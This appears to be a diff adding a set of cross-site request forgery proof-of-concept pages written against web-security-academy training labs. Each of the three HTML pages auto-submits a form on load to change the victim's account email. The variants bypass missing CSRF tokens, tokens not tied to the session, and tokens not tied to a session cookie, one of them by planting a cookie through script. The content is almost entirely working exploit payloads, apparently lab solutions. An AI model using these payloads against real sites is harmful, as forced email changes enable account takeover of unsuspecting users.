@@ -1,0 +1,24 @@
+﻿<html><form enctype="application/x-www-form-urlencoded" method="POST" action="https://ac351f9d1f6e62638088ad1a00fd00d8.web-security-academy.net/email/change-email"><table><tr><td>email</td><td><input type="text" value="mynewemail@email.com" name="email"></td></tr>
+</table><input type="submit" value="https://ac351f9d1f6e62638088ad1a00fd00d8.web-security-academy.net/email/change-email"></form>
+<body onload="document.forms[0].submit()">
+</html>
+
+
+<!--- CSRF token tied to other user session or is non-unique --->
+<html><form enctype="application/x-www-form-urlencoded" method="POST" action="https://ac351f9d1f6e62638088ad1a00fd00d8.web-security-academy.net/email/change-email"><table><tr><td>email</td><td><input type="text" value="mynewemail@email.com" name="email"></td></tr>
+<tr><td>csrf</td><td><input type="text" name="csrf" value="MYXqktFYYXpQHI8ITYTMTeCVyjU1labo"></td></tr>
+</table><input type="submit" value="https://ac351f9d1f6e62638088ad1a00fd00d8.web-security-academy.net/email/change-email"></form>
+<body onload="document.forms[0].submit()">
+</html>
+
+
+<!--- CSRF token is not tied to a session cookie --->
+<html>
+<script type="text/javascript">
+	document.cookie="csrfKey=aKeyQWFCVmMQCblpUoDIcrsatpRMiPDC";
+</script>
+<form enctype="application/x-www-form-urlencoded" method="POST" action="https://acc21f951f082295804552bb00c400e2.web-security-academy.net/email/change-email"><table><tr><td>email</td><td><input type="text" value="mynewemail@email.com" name="email"></td></tr>
+<tr><td>csrf</td><td><input type="text" name="csrf" value="aKeyQWFCVmMQCblpUoDIcrsatpRMiPDC"></td></tr>
+</table><input type="submit" value="https://acc21f951f082295804552bb00c400e2.web-security-academy.net/email/change-email"></form>
+<body onload="document.forms[0].submit()">
+</html>
